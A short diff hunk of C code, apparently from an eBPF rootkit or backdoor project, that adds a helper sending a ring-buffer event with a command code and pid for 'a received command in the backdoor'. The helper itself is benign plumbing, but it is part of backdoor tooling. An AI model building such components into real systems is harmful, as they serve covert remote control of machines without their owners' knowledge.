@@ -41,6 +41,25 @@ static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, eve
 	bpf_ringbuf_submit(event, 0);
     return 0;
 }
+
+/**
+ * @brief Sends an event indicating a received command in the backdoor
+ * 
+ * @return 0 if ok, -1 if error
+ */
+static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code){
+    struct rb_event *event = (struct rb_event*) bpf_ringbuf_reserve(rb, sizeof(struct rb_event), 0);
+    if(!event){
+        return -1;
+    }
+
+    event->code = code;
+    event->event_type = COMMAND;
+    event->pid = pid;
+
+	bpf_ringbuf_submit(event, 0);
+    return 0;
+}
     
 
 
